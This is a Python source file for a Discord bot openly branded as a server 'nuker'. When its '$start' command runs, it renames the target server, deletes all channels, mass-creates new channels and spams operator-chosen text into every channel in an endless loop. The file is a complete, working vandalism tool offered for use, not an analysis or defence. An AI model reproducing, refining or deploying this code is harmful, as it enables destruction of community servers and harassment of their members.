# libs
import discord
import random
import os
import time
from discord.ext import commands

# prefix
BOT_PREFIX = "$"

bot = commands.Bot(command_prefix=BOT_PREFIX, case_insensitive=True)
bot.remove_command('Help')

# token
token = "ENTER TOKEN HERE!!!"

os.system("title Checking Token")
print("[+] Checking token...")

# invalid command
@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        print("[!] Command Not Found! Type '$start' To Nuke")

@bot.event
async def on_ready():
    # valid token
    print("[+] Valid token!")
    time.sleep(1)
    os.system('cls && title Sudo\'s Server Nuker')
    # cool text
    print("""{}
    ███████╗██╗   ██╗██████╗  ██████╗ ███████╗    ███████╗███████╗██████╗ ██╗   ██╗███████╗██████╗     ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
    ██╔════╝██║   ██║██╔══██╗██╔═══██╗██╔════╝    ██╔════╝██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
    ███████╗██║   ██║██║  ██║██║   ██║███████╗    ███████╗█████╗  ██████╔╝██║   ██║█████╗  ██████╔╝    ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
    ╚════██║██║   ██║██║  ██║██║   ██║╚════██║    ╚════██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██╔══╝  ██╔══██╗    ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
    ███████║╚██████╔╝██████╔╝╚██████╔╝███████║    ███████║███████╗██║  ██║ ╚████╔╝ ███████╗██║  ██║    ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
    ╚══════╝ ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝    ╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝    ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                                                                              
{}\n\t[+] Welcome To Sudos's Server Nuker (•◡ •) /\n\t[+] Nuker Loaded!\n\t[+] Type '$start' In The Server To Nuke\n\t[+] Subscribe To Sudo On YT\n{}""".format("="*150,"="*150,"="*150))

# bot added to a server
@bot.event
async def on_guild_join(ctx):
    print("[+] Bot has been added to a server")

    if len(bot.guilds) == 1:
        print(f"[+] The bot is in 1 server now")
    else:
        print(f"[+] The bot is in {len(bot.guilds)} servers now")

# bot removed from a server
@bot.event
async def on_guild_remove(ctx):
    print("[!] Bot has been removed from a server")

    if len(bot.guilds) == 1:
        print(f"[!] The bot is in 1 server now")
    elif len(bot.guilds) == 0:
        print(f"[!] The bot is in 0 servers now")
    else:
        print(f"[!] The bot is in {len(bot.guilds)} servers now")

@bot.command(pass_content=True)
async def start(ctx):
    await ctx.message.delete()
    guild = ctx.guild

    # inputs
    server_name = input("[>] Enter server name here: ")
    channel = input("[>] Enter channel name here: ")
    spam_txt = input("[>] Enter text to spam here: ")
    
    channel_names = [channel]

    # changing server name
    await ctx.guild.edit(name=server_name)
    print(f"\n[+] Server named changed to '{server_name}'")
    
    # deleting channels
    for channel in list(ctx.message.guild.channels):
        try:
            await channel.delete()
        except:
            pass
    print("[+] All channels have been deleted")

    # making new channels
    for i in range(1):
        await guild.create_text_channel(random.choice(channel_names))
        for channel in guild.text_channels:
            for i in range(30):
                await guild.create_text_channel(random.choice(channel_names))
    print("[+] New channels have been made")

    # spamming channels
    time.sleep(1)
    print("[+] Spamming server")
    while True:
        for channel in guild.text_channels:
            await channel.send(f"{spam_txt}")

# running bot
try:
    bot.run(token)
except discord.errors.HTTPException and discord.errors.LoginFailure:
    time.sleep(1)
    print("[!] Token incorrect! Try again")
    time.sleep(1)
